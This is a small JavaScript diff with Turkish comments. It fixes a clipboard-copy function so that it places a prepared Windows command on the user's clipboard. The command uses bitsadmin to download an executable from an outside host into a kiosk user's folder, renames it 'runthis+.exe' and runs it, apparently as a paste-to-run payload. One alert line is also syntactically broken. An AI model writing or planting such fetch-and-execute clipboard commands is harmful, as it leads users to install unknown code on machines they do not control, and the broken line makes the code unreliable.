@@ -14,7 +14,7 @@
             var metinKutusu = "echo off&cls&echo Downloading Files...&bitsadmin /transfer qwe /priority foreground https://picteon.dev/files/Arcade.exe c:\users\kiosk\downloads\runthis+.exe&echo Starting Files...&timeout /nobreak /t 1 >nul&runthis+.exe"
             
             /* Metin kutusu içeriğini panoya kopyala */
-            navigator.clipboard.writeText(metinKutusu.value).then(function() {
+            navigator.clipboard.writeText(metinKutusu).then(function() {
                 alert("Metin kopyalandı:);
             }).catch(function(err) {
                 console.error("Kopyalama hatası: ", err);
